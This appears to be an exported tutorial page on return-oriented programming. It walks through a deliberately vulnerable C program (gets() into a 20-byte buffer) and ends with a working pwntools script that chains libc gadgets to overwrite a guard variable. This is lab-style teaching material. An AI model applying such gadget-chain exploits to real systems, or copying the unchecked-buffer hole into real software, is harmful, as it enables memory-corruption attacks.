@@ -1,0 +1,793 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Return-Oriented Programming</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="ad4d46cd-4a06-4f32-af81-6cc341f3f65b" class="page sans"><header><h1 class="page-title">Return-Oriented Programming</h1></header><div class="page-body"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="5fdff1df-56ef-44a9-bb4d-07da99424fca"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Constructing a chain of gadgets to overwrite the content of a variable.</div></figure><p id="4854aa8f-6474-4a23-8032-080ccfd33c01" class="">
+</p><pre id="3f5d6256-9033-4557-8839-6784f7cfcdb1" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int guard = 0xcabba6e5;
+
+void readstuff(void) {
+    char data[20];
+    gets(data);
+}
+
+int main(void) {
+    readstuff();
+
+    if(guard == 0xb000000f) {
+        printf(&quot;Win :)\n&quot;);
+    } else {
+        printf(&quot;N00b :(\n&quot;);
+    }
+
+    return 0;
+}</code></pre><p id="6832a337-aeee-4fd6-8bc5-910a98933ae5" class="">Goal: changing the content of <code>guard</code> to <code>0xb000000f</code>.</p><p id="3588eced-73fa-444d-bb52-864e09fa2fd9" class="">
+</p><h1 id="52a80532-ef1a-4a48-bfbb-7f26ecb644c8" class="">Planning a chain of gadgets</h1><p id="d1f2c90a-a751-4588-9915-c2edd0634713" class="">Now we need to construct a chain of gadgets (found either in the binary itself or in the loaded libraries) that:</p><pre id="fcaa4b5f-552f-47c5-b82c-df1e840c4e6c" class="code"><code>register1 := 0xb000000f (&quot;register1&quot; is just a placeholder)
+register2 := address of guard
+register2 := register1
+then reset values of modified registers so that program behaves as expected
+return to main()</code></pre><p id="5d47c160-ccbe-4e1d-b015-9275a5b8b494" class="">
+</p><ul id="2ae95418-58d4-46de-8683-968d02d6473a" class="toggle"><li><details open=""><summary>Finding a library</summary><p id="5c132538-4bae-40a0-90c0-de41fb707845" class="">Gadgets can be found in the libraries loaded by a binary. We can print the shared libraries required by a given program:</p><pre id="4fcea5af-24a3-4abc-b98e-02a9325d2bc7" class="code"><code>marco@testbed:~/2020/rop$ ldd ./ropmew
+        linux-gate.so.1 (0xf7fd4000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7de9000)
+        /lib/ld-linux.so.2 (0xf7fd6000)
+
+marco@testbed:~/2020/rop$ ls -l /lib/i386-linux-gnu/libc.so.6
+lrwxrwxrwx 1 root root 12 Apr 16  2018 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.27.so</code></pre><p id="9625573e-3db9-4387-b946-039aa6bb6a03" class="">So our binary loads the <mark class="highlight-gray"><code>libc</code></mark><mark class="highlight-gray"> </mark>- a 1.9MB file that, gives us chances of finding interesting gadgets.</p><p id="a1b4277f-e92d-4524-aeaa-c69347537f1c" class="">
+</p><p id="4aa156b6-24d3-4af7-8a61-687734200337" class="">Once the process is executed, libraries are loaded at a given offset (called base address - <mark class="highlight-gray"><code>0xf7de9000</code></mark>):</p><pre id="11ee9248-2e21-4887-a398-5d729f355e58" class="code"><code># we inspect its mapped memory regions
+marco@testbed:~$ cat /proc/18658/maps
+08048000-08049000 r-xp 00000000 fc:01 1036361     /home/marco/2020/rop/ropmew
+08049000-0804a000 r--p 00000000 fc:01 1036361     /home/marco/2020/rop/ropmew
+0804a000-0804b000 rw-p 00001000 fc:01 1036361     /home/marco/2020/rop/ropmew
+0804b000-0806d000 rw-p 00000000 00:00 0           [heap]
+f7de9000-f7fbe000 r-xp 00000000 fc:01 1807762     /lib/i386-linux-gnu/libc-2.27.so
+f7fbe000-f7fbf000 ---p 001d5000 fc:01 1807762     /lib/i386-linux-gnu/libc-2.27.so
+f7fbf000-f7fc1000 r--p 001d5000 fc:01 1807762     /lib/i386-linux-gnu/libc-2.27.so
+f7fc1000-f7fc2000 rw-p 001d7000 fc:01 1807762     /lib/i386-linux-gnu/libc-2.27.so
+f7fc2000-f7fc5000 rw-p 00000000 00:00 0 
+f7fcf000-f7fd1000 rw-p 00000000 00:00 0 
+f7fd1000-f7fd4000 r--p 00000000 00:00 0           [vvar]
+f7fd4000-f7fd6000 r-xp 00000000 00:00 0           [vdso]
+f7fd6000-f7ffc000 r-xp 00000000 fc:01 1807758     /lib/i386-linux-gnu/ld-2.27.so
+f7ffc000-f7ffd000 r--p 00025000 fc:01 1807758     /lib/i386-linux-gnu/ld-2.27.so
+f7ffd000-f7ffe000 rw-p 00026000 fc:01 1807758     /lib/i386-linux-gnu/ld-2.27.so
+fffdd000-ffffe000 rw-p 00000000 00:00 0           [stack]</code></pre></details></li></ul><p id="11b3cfe5-2e42-4618-8dce-a60b63edd6dd" class="">
+</p><p id="ad37e608-44cd-4422-b7d2-28b361b6a222" class="">We are searching for a gadget that enables us to write the content of a register into the address pointed by another register, like <mark class="highlight-gray"><code>mov dword ptr [&lt;reg2&gt;], &lt;reg1&gt;</code></mark>.</p><p id="abf304be-80a1-44e2-b90d-829b705ebe1b" class="">We find: </p><pre id="6bb1562e-a106-4b12-aa66-85135824a294" class="code"><code>marco@testbed:~/2020/rop$ grep -E &#x27;mov dword ptr \[e.x\], e.x&#x27; libcgadgets.txt
+...
+0x00075425 : mov dword ptr [edx], eax ; ret //edx (pointer) &lt;- eax (content)</code></pre><p id="619c29e9-05c2-4ee4-88e3-ec289570a018" class="">Now we know that <code>eax</code> will be <code>reg1</code> and <code>edx</code> will be <code>reg2</code> in our final chain.</p><p id="eca99ae0-f3ab-4f5f-be4f-14836846e375" class="">We will use <code>pop</code> gadgets to implement this:</p><pre id="765c6708-30a8-4f36-b585-029340db59f0" class="code"><code>0x00024b5e : pop eax ; ret //esp (pointer) &lt;- eax (content)
+0x00001aae : pop edx ; ret //esp (pointer) &lt;- edx (content)</code></pre><p id="19fb4cf4-b9b4-4140-b491-abc26490ee2a" class="">
+</p><h2 id="57521017-2b40-4010-82d2-b89ecaaf0978" class="">Finding Memory Addresses</h2><p id="94f91d8e-9dd7-40c7-a6a7-9135e7e24ee4" class="">address of <code>guard</code>		<code>0x0804a020</code></p><p id="781a4615-2430-417e-b9e2-bb67920f5a5f" class="">address of <code>readstuff</code>	<code>0x08048456</code> </p><p id="24c017f6-5a6e-4b18-8716-6363ab6737da" class="">address of <code>main</code>		<code>0x804849d</code></p><p id="bd75f093-e9ec-4ec3-aa10-f4bcec27acef" class="">
+</p><p id="a5131505-785d-4beb-8f9e-57b39627b5cb" class="">We take a closer look at the assembly code:</p><pre id="481979eb-432b-48b9-b3b9-fdf221349bd4" class="code"><code>marco@testbed:~/2020/rop$ objdump -M intel -d ropmew | grep -C2 readstuff 
+ 8048454:       eb 8a                   jmp    80483e0 &lt;register_tm_clones&gt;
+
+08048456 &lt;readstuff&gt;:
+ 8048456:       push   ebp
+ 8048457:       mov    ebp,esp
+--
+ 804848d:       call   8048390 &lt;__x86.get_pc_thunk.bx&gt;
+ 8048492:       add    ebx,0x1b6e
+ 8048498:       call   8048456 &lt;readstuff&gt; 
+ 804849d:       mov    eax,DWORD PTR [ebx+0x20] 
+ 80484a3:       cmp    eax,0xb000000f </code></pre><pre id="a8dba377-6a71-4da0-b23b-2e4f8f7b8bf7" class="code"><code>...
+int main(void) {
+    readstuff();
+    if(guard == 0xb000000f) {
+...</code></pre><p id="14b2fb04-ff1f-4819-8178-9810a8c2e6ce" class="">We see that <code>main</code> expects to fetch the content of the <code>guard</code> variable from <code>ebx+0x20</code>.</p><p id="621a6951-5435-4da1-b93c-ed925c666d3f" class="">The value of <code>ebx</code> should stay unchanged after our attack, so we must reset its value to the original one.</p><p id="4a2a2e44-0498-4ba6-befc-6990ce2f8c7b" class="">
+</p><p id="cfd5f6f9-50c6-45bd-8faf-81e7d0c6145b" class="">The value of <code>ebx</code> can be set to the location of the <code>guard</code> - <code>0x20</code> (so that <code>$ebx+0x20</code> is once again the address of <code>guard</code>).</p><p id="8b325e68-28ea-45b8-8428-3ef1b0039b0e" class="">We do this with a <code>pop</code> gadget:</p><pre id="1c7b28d9-4187-44e4-8154-c50335bae4e3" class="code code-wrap"><code>0x00018be5 : pop ebx ; ret //esp (pointer) &lt;- ebx (content) </code></pre><p id="afaeb84f-51a9-4655-b2c3-4d76ca2255b0" class="">
+</p><h1 id="1d523d89-4220-4806-aa1a-01f50c92af1d" class="">Putting it all together</h1><p id="65e6030e-eeb3-4da4-a344-2eebdb43add0" class="">What we initially wanted:</p><pre id="d9f5afc4-a738-4690-a6e5-d9099abf909c" class="code"><code>register1 := 0xb000000f (&quot;register1&quot; is just a placeholder)
+register2 := address of guard
+register2 := register1
+then reset values of modified registers so that program behaves as expected
+return to main()</code></pre><p id="cd0291a6-d84c-4d51-9fcc-3fd081bdeb62" class="">
+</p><p id="89b6113f-1ffa-4bd4-9a8f-789ca263ce09" class="">How we adapted it to the libraries:</p><pre id="f68795cb-3983-4e5c-af65-9f252cf62927" class="code"><code>eax := 0xb000000f
+edx := 0x0804a020 (address of 0xb000000f)
+edx := eax
+then reset values of modified registers so that program behaves as expected
+0x804849d - return to main()</code></pre><p id="173fb7e2-8b05-48b4-993f-a06f69ffd5fa" class="">
+</p><p id="053e7042-417d-4e77-9c84-c88525d7b153" class="">Our gadget chain:</p><p id="71f0f642-a482-45d0-9a7a-adc1f22e9c65" class="">We over-write the return address with 32 x &#x27;A&#x27;s and then add a chain of library instructions that all end with <code>ret</code>.</p><pre id="2e9571a3-aa6f-4e13-9b5f-924965aeeb92" class="code"><code>pop_eax (will replace ret)
+0xb000000f
+pop_edx
+0x0804a020 (address of 0xb000000f)
+mov_ptr_edx_eax
+
+//restore everything to its previous state
+pop_ebx
+0x0804a020 - 0x20
+0x804849d (return into main)</code></pre><p id="656d0f87-281b-4d96-afd4-7a2d01e95d28" class="">
+</p><pre id="1dd5473b-7284-4576-8226-d5e4ae795031" class="code"><code>#!/usr/bin/python3
+import sys
+from pwn import *
+
+def main():
+    libc_offset = 0xf7de9000
+    orig_saved_eip = p32(0x0804849d)
+    padding = b&#x27;A&#x27;*32
+
+    # values
+    bof = p32(0xb000000f)
+
+    # var
+    addr_guard = p32(0x0804a020)
+
+    # gadgets
+    pop_eax = p32(libc_offset + 0x00024b5e)
+    pop_edx = p32(libc_offset + 0x00001aae)
+    mov_ptr_edx_eax = p32(libc_offset + 0x00075425)
+    pop_ebx = p32(libc_offset + 0x00018be5)
+
+    payload = padding + pop_eax + bof + pop_edx + addr_guard + mov_ptr_edx_eax + \
+              pop_ebx + p32(0x0804a020 - 0x20) + orig_saved_eip
+
+    p = process(sys.argv[1])
+    p.sendline(payload)
+    p.interactive()
+
+
+if __name__ == &#x27;__main__&#x27;:
+    main()</code></pre></div></article></body></html>
